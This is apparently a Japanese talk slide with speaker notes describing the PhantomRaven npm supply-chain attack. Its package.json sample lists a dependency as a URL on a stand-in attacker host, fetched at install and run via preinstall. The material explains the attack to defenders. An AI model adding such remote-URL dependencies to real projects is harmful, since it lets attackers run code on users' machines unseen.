誰も気付かなかったら？

PhantomRaven

手口: 依存先を npm のパッケージ名ではなく URL で書く

"dependencies": {
  "evil-pkg": "https://attacker.example.com/evil-pkg.tgz"
}

install 時に npm の外から取ってきて、preinstall で実行。npm 上の本体は空っぽで、依存も 0 に見える

→ 2か月以上気付かれなかった

誰も気付かなければ何日待っても防げない

では、誰も気付かなかったらどうなるか。2025年の PhantomRaven では、2か月以上気付かれず、8.6万回インストールされました。パッケージ本体は空っぽで、悪意あるコードはインストールのときに npm の外のサーバーから取ってくる作りでした。監視する側から見ると依存は0で、検査をすり抜けたんです。誰も気付かなければ、何日待っても防げません。
